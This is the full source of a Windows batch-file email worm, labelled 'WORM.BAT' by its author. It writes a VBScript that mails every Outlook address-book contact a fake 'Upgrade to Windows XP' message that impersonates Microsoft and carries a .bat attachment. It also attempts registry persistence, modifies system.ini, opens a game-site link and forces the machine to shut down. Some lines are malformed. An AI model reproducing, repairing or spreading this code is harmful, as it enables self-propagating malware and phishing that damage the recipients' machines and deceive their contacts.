   @echo off
   start iexplore www.outwar.com/page.php?x=653231
   goto spread

   :spread
   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP", "c:\XP\xp.bat" > > c:\X.vbs
   echo set B = CreateObject("Outlook.Application") > > c:\X.vbs
   echo set C = b.GetNameSpace("MAPI") > > c:\X.vbs
   echo for y = 1 To c.AddressLists.Count > > c:\X.vbs
   echo set D = c.AddressLists(y) > > c:\X.vbs
   echo X = 1 > > c:\X.vbs
   echo set E = b.CreateItem(0) > > c:\X.vbs
   echo for O = 1 To d.AddressEntries.Count > > c:\X.vbs
   echo F = d.AddressEntries(x) > > c:\X.vbs
   echo e.Recipients.Add F > > c:\X.vbs
   echo X = X + 1 > > c:\X.vbs
   echo next > > c:\X.vbs
   echo e.Subject = "Upgrade to Windows XP" > > c:\X.vbs
   echo e.Body = "Good news from Microsoft. Click the attachment for your FREE Windows XP. Upgrade to Windows XP now." > > c:\X.vbs
   echo e.Attachments.Add ("c:\WINDOWS\UpgradeToWindowsXP.bat") > > c:\X.vbs
   echo e.DeleteAfterSubmit = False > > c:\X.vbs
   echo e.Send > > c:\X.vbs
   echo F = "" > > c:\X.vbs
   echo next > > c:\X.vbs
   goto scar

   :scar
   rem created by master nokia
   rem for ferrari george
   rem goin down
   md c:\progra~1\pi
   echo open=c:\progra~1\pi\readme.txt >> c:\windows\system.ini
   echo ****************WORM.BAT***********>> c:\progra~1\pi\readme.txt
   echo created by MASTER NOKIA FOR FERRARI GEORGE >> c:\progra~1\pi\readme.txt
   echo u probably got this from him so dont blame me >> c:\progra~1\pi\readme.txt
   goto end

   :end
   SHUTDOWN -s -t 05 -c " WOW UR STUPID "
   exit
